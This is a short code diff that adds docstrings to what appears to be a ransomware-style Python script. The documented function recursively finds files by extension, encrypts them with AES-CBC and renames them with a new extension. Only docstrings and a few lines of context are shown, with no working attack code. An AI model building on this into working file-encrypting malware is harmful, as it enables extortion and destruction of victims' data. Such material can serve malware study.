@@ -18,6 +18,18 @@ from Crypto import Random
 
 
 def check_os(osname: str) -> bool:
+    """ Check if the specified operating system is supported.
+
+    Args:
+    osname -- the name of the operating system (string)
+
+    Returns:
+    True if the operating system is supported, False otherwise (boolean)
+
+    Raises:
+    This function may raise a SystemExit exception if the Python version is not supported.
+    """
+
     PATH = os.getenv('HOME')
     
     if (os.getuid() == 0):
@@ -61,6 +73,20 @@ def find_and_encrypt(
     key: bytes,
     block_bytes: int
 ) -> None:
+    """
+    Recursively searches for files with the specified extensions in the specified path and its subdirectories,
+    encrypts them using the AES-CBC algorithm with the specified key and saves them with a new extension.
+    Files with the specified names to be hidden are skipped.
+    
+    Args:
+        path (str): The directory path to start the search from.
+        ext_files (list): A list of file extensions to be encrypted.
+        cd (list): A list of directory names to exclude from the search.
+        hidden (str): A string containing the name of files to be hidden.
+        new_ext (str): A string with the new extension to be added to the encrypted files.
+        key (bytes): The encryption key as bytes.
+        block_bytes (int): The size of the block in bytes that the file will be read in, and also the size of the encryption block.
+    """
 
     # # go in search of the file.
     for root, dirs, files in os.walk(path):
